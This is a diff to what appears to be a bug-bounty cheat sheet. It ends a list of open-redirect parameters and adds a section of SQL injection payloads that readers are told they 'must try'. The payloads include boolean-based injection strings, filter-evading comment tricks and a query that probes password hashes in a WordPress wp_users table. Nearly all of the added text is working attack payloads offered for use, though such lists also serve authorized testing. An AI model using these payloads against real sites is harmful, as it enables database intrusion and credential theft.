@@ -186,4 +186,12 @@ site:target.com AND inurl:link=http(s)
 ?externalLink=
 ?URL=
 ```
-
+## SQL Injection Payloads
+***Some updated SQLi payloads you must try:)***
+```sql
++OR+1=insert(1,1,1,1)--
++OR+1=replace(1,1,1)--
+{`foo`/*bar*/(select+1)\}'
+{`foo`/*bar*/(select%2b2)}
+{`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
+```
